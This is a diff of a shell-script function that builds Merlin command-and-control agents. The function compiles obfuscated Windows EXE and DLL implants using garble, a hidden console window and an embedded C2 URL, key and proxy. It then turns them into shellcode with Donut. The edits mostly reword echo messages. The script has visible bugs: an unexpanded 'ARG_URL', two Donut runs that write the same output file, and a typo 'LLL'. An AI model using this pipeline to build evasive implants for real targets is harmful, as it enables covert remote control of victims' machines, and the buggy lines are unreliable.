@@ -27,16 +27,18 @@ func_Build_merlin_Agent(){
   case "$response" in
         [yY][eE][sS]|[yY])
   cd /opt/merlin-agent
-  echo "[*] Building EXE agents in Docker"
+  echo "[*] Building EXE agents in Docker. If any error they will be below."
   go mod download github.com/Ne0nd0g/merlin-agent
   go mod download github.com/Ne0nd0g/merlin
   export GOOS=windows GOARCH=amd64;garble -tiny build -trimpath -ldflags "-s -w -X main.build=bdf7a31107e196854b524fd7d3ae8440c169412d -X github.com/lunarobliq/merlin-agent/agent.build=bdf7a31107e196854b524fd7d3ae8440c169412d -X main.protocol=$ARG_PROTO -X main.url=$ARG_URL -X main.host=$Host -X main.psk=$ARG_PSK -X main.proxy=$ARG_PROXY -X main.sleep=$ARG_SLEEP -X main.useragent=$useragent -H=windowsgui -buildid=" -gcflags=all=-trimpath=/go -asmflags=all=-trimpath=/go -o /opt/artifacts/$Filename.exe ./main.go
-  echo "[*] Building DLL agents in Docker"
+  echo "[*] Building DLL agents in Docker. If any error they will be below."
   cd /opt/merlin-agent-dll
   export GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1;garble -tiny build -ldflags "-s -w -X main.build=8b17d8559377825a091ce89b94a224c76e40c56f -X github.com/lunarobliq/merlin/pkg/agent.build=8b17d8559377825a091ce89b94a224c76e40c56f -X main.protocol=$ARG_PROTO -X main.url=ARG_URL -X main.host=$Host -X main.psk=$ARG_PSK -X main.proxy=$ARG_PROXY -X main.sleep=$ARG_SLEEP -buildid=" -gcflags=all=-trimpath=/go -asmflags=all=-trimpath=/go -buildmode=c-archive -o main.a main.go; x86_64-w64-mingw32-gcc -shared -pthread -o /opt/artifacts/$Filename.dll merlin.c main.a -lwinmm -lntdll -lws2_32
+  echo "[*] Running Donut on EXE. If any error they will be below."
   /opt/donut/donut -a 2 -f 1 -o /opt/artifacts/donut_$Filename.bin /opt/artifacts/$Filename.exe
+  echo "[*] Running Donut on LLL. If any error they will be below."
   /opt/donut/donut -a 2 -f 1 -o /opt/artifacts/donut_$Filename.bin /opt/artifacts/$Filename.dll
-  echo "[*] Build Done"
+  echo "[*] Done"
   ;;
     [rR])
     func_Build_merlin_Agent
